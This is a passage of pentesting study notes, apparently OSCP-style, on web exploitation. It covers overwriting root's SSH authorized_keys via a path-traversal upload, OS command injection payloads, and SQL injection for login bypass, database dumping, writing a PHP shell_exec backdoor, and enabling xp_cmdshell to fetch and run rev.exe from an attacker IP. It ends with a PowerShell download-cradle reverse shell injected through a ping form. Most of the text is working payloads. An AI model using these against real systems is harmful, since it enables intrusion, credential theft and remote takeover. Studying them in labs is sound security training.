2. Now that the **authorized_keys** file contains our public key, we can upload it using the relative path **../../../../../../../root/.ssh/authorized_keys**. We will select our **authorized_keys** file in the file upload form and enable intercept in Burp before we click on the *Upload* button. When Burp shows the intercepted request, we can modify the filename accordingly and press *Forward*.
3. If we've successfully overwritten the **authorized_keys** file of the root user, we should be able to use our private key to connect to the system via SSH. kali@kali:~$ rm ~/.ssh/known_hosts
    ```sh
    kali@kali:~$ ssh -p 2222 -i fileup root@mountaindesserts.com
    ...
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    ...
    root@76b77a6eae51:~#
    ```

> **Note**:
> Often the root user does not carry SSH access permissions. However, since we can't check for other users by, for example, displaying the contents of **/etc/passwd**, this is our only option.

## OS Command Injection
Web applications often need to interact with the underlying operating system, such as when a file is created through a file upload mechanism. Web applications should always offer specific APIs or functionalities that use prepared commands for the interaction with the system. Prepared commands provide a set of functions to the underlying system that cannot be changed by user input. However, these APIs and functions are often very time consuming to plan and develop.

Sometimes a web application needs to address a multitude of different cases, and a set of predefined functions can be too inflexible. In these cases, web developers often tend to directly accept user input, then sanitize it. This means that user input is filtered for any command sequences that might try to change the application's behavior for malicious purposes.

You should usually switch to Burp *HTTP History* to understand how the POST requests are performed to make your owns using Burp itself or curl.
What we usually need to use are OS commands like **;** or **&&** to chain commands and obviously the associated URL-encoded versions. We can use trial-and-error to poke around the filter and review what's allowed. Since we established that we cannot simply specify another command, let's try to combine commands with a URL-encoded semicolon represented as "%3B". Semicolons can be used in a majority of command lines, such as PowerShell or Bash as a delimiter for multiple commands. Alternatively, we can use two ampersands, "&&", to specify two consecutive commands. For the Windows command line (CMD), we can also use one ampersand.

If we are on Windows we may want to understand more about how our injected commands are executed. We will first determine if our commands are executed by PowerShell or CMD. In a situation like this, we can use a handy snippet, published by [PetSerAl](https://stackoverflow.com/users/4003407/user4003407) that displays "CMD" or "PowerShell" depending on where it is executed.
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
We'll use URL encoding once again to send it.
```sh
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
```

## SQL Injection
### Identifying SQL Injection Vulnerabilities
Before we can find SQL injection vulnerabilities, we must first identify locations where data might pass through a database.

We can use the single quote ('), which SQL uses as a string delimiter, as a simple check for potential SQL injection vulnerabilities. If the application doesn’t handle this character correctly, it will likely result in a database error and can indicate that a SQL injection vulnerability exists.
### Authentication Bypass
- Sample login query
  ```sql
  select * from users where name = 'tom' and password = 'jones';
  ```
- If we control the value being passed in as $user, we can subvert the logic of the query by submitting `tom' or 1=1;#`:
  ```sql
  select * from users where name = 'tom' or 1=1;#' and password = 'jones';
  ```
- The pound character (#) is a comment marker in MySQL/MariaDB. It effectively removes the rest of the statement, so we're left with:
  ```sql 
  select * from users where name = 'tom' or 1=1;
  ```
- Since the "1=1" condition always evaluates to true, all rows will be returned. If we do encounter errors when our payload is returning multiple rows, we can instruct the query to return a fixed number of records with the LIMIT statement:
  ```sql 
  select * from users where name = 'tom' or 1=1 LIMIT 1;#
  ```
### Enumerating the Database
#### Column Number Enumeration
We can add an `order by` clause to the query for simple enumeration. This clause tells the database to sort the results of the query by the values in one or more columns. We can use column names or the *column index* in the query.

1. Let's submit the following URL (to instruct the database to sort the results based on the values in the first column):
  ```url
  http://10.11.0.22/debug.php?id=1 order by 1--
  ```
2. We can submit multiple queries, incrementing the order by clause each time until the query generates an error, indicating that the maximum number of columns returned by the query in question has been exceeded.  
   - Since we will need to iterate the column number an arbitrary number of times, we should automate the queries with Burp Suite's Repeater tool.  
   - To do this, we must first launch Burp Suite, turn off *Intercept* and launch the URL against our Windows target. In the *Proxy* > *HTTP history* we should see the request we want to repeat.  
   - Next, we will right-click on the request and select *Send to Repeater*. The request should now show under the Repeater tab.  
   - We can use the *search* box under the *Response* pane to search for "Error" and verify there are no matches in the response body.
  ```url
  1' order by 1--   #True
  1' order by 2--   #True
  1' order by 3--   #True
  1' order by 4--   #False - Query is only using 3 columns 
                        #-1' UNION SELECT 1,2,3--   #True
  ```

#### Understanding the Layout of the Output
Now that we know how many columns are in the table, we can use this information to extract further data with a `UNION` statement. Unions allow us to add a second select statement to the original query, extending our capability, but each select statement must return the same number of columns.
  ```url
  1' UNION SELECT null--   #Not Working
  1' UNION SELECT null,null--   #Not Working
  1' UNION SELECT null,null,null--   #Worked
  ```
- You should use `null` values as in some cases the type of the columns of both sides of the query must be the same.
- Updating our payload to use a union with numbers matching the #ofColumns
```url
http://10.11.0.22/debug.php?id=1 union all select 1, 2, 3--
```

The missing number in the output is the column not shown :)
#### Extracting Data from the Database
We can now start extracting information from the database. The following examples use commands specific to MariaDB. However, most other databases offer similar functionality with slightly different syntax. Regardless of what database software we target, it's best to understand the platform-specific commands.

⚠️ Potential Rabbit Hole: You need to display the DB data using a TEXT field not an INT, etc... one!!

- Output the version of MariaDB:
  ```url
  http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version--
  ```
- Extract the database user:
  ```url
  http://10.11.0.22/debug.php?id=1 union all select 1, 2, user()--
  ```
- Extract table names:
  ```url
  http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables--
  ```
- Extract table columns
  ```url
  http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'--
  ```
- Extract the users table
  ```url
  http://10.11.0.22/debug.php?id=1 union all select 1, username, password from users--
  ```
### From SQL Injection to Code Execution
Depending on the operating system, service privileges, and filesystem permissions, SQL injection vulnerabilities can be used to read and write files on the underlying operating system. Writing a carefully crafted file containing PHP code into the root directory of the web server could then be leveraged for full code execution.

⚠️ Potential Rabbit Hole: You don't know the root directory of the web server. 

0. See if we can read a file using the `load_file` function:
  ```url
  http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')--
  ```
1. Use the `INTO OUTFILE` function to create a malicious PHP file in the server’s web root. Based on error messages we've already seen, we should know the location of the web root. We'll attempt to write a simple PHP one-liner, similar to the one used in the LFI example:
  ```url
  http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
  ```
2. This command produces an error message but this doesn't necessarily mean the file creation was unsuccessful. Let's try to access the newly-created `backdoor.php` page with a cmd parameter such as ipconfig:
  ```url
  http://10.11.0.22/backdoor.php?cmd=ifconfig
  ```
#### Exploit Stacked Queries
1. **Check the privileges of DB user.** Check if the DB user is `sysadmin` or not since only him can enable `xp_cmdshell` and execute OS level commands. We should see a 1 as response.
    ```url
    1' UNION SELECT 1,(SELECT is_srvrolemember('sysadmin')),3--
    ```
2. **Check the support for stacked queries.** Check if we can run multiple queries in a single statement by separating them with a semicolon (`;`) character.
    ```url
    1' UNION SELECT 1,2,3; WAITFOR DELAY '0:0:5';--
    ```
3. **Enable `xp_cmdshell`.**
    ```url
    1'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
    ```
4. **Execute `xp_cmdshell`.**
    ```url
    1'; EXEC xp_cmdshell 'certutil -urcache -f http://192.168.119.xxx:8000/rev.exe rev.exe';--+ Check server gets hit
    ```
    ```url
    1'; EXEC xp_cmdshell '.\rev.exe';--+ got shell ? 
    ```
References:
- [A Not-So-Blind RCE with SQL Injection](https://medium.com/@notsoshant/a-not-so-blind-rce-with-sql-injection-13838026331e)
- [Pentestmonkey SQLi cheat-sheet](https://pentestmonkey.net/category/cheat-sheet/sql-injection)
- [HackTricks SQLi](https://book.hacktricks.xyz/pentesting-web/sql-injection)
### Automating SQL Injection
TODO: SQLMap

## Escaping WAF filters

```sh
curl -X POST --data-urlencode "action=192.168.45.229 && powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.229/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.45.229 -Port 53\"" http://10.11.1.31/_vti_pingit/pingit.py
```
